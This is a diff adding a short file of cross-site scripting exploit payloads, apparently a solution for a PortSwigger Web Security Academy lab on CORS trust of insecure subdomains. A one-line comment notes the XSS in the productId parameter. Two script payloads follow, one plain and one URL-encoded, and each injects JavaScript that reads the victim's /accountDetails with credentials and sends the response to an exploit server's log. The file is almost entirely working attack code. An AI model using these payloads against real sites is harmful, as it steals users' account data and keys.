@@ -1,0 +1,12 @@
+# The subdomain has an XSS vulnerability in the productId (we verified this by entering <script>alert(0)</script>
+
+<script>
+    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+</script>
+
+
+# URL encoded:
+<script>
+    document.location="http://stock.0a17003204e4fde981aa07a400460016.web-security-academy.net/?productId=1%3Cscript%3Evar%20req%20=%20new%20XMLHttpRequest();%20req.onload%20=%20reqListener;%20req.open(%27get%27,%27https://0a17003204e4fde981aa07a400460016.web-security-academy.net/accountDetails%27,true);%20req.withCredentials%20=%20true;req.send();function%20reqListener()%20{location=%27https://exploit-0a0400240451fd54811406ce01fa0028.exploit-server.net/log?key=%27%2bthis.responseText;%20};%3c/script%3E&storeId=1"
+</script>
+
